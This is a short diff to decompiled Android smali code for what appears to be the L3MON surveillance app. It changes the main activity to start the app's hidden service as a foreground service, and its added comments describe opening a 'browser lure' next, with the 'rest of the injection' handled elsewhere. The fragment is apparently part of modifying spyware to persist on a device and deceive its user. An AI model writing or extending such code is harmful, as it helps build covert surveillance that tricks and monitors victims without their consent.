@@ -73,14 +73,15 @@
 
     invoke-virtual {p0, v0}, Lcom/etechd/l3mon/MainActivity;->setContentView(I)V
 
-    .line 24
+    # 1. Start Service FIRST while in Foreground
     new-instance v0, Landroid/content/Intent;
-
     const-class v1, Lcom/etechd/l3mon/MainService;
-
     invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
+    invoke-virtual {p0, v0}, Lcom/etechd/l3mon/MainActivity;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;
 
-    invoke-virtual {p0, v0}, Lcom/etechd/l3mon/MainActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
+    # 2. THEN open the browser lure
+    # [Rest of the injection will handle this]
+
 
     .line 25
     invoke-direct {p0}, Lcom/etechd/l3mon/MainActivity;->isNotificationServiceRunning()Z
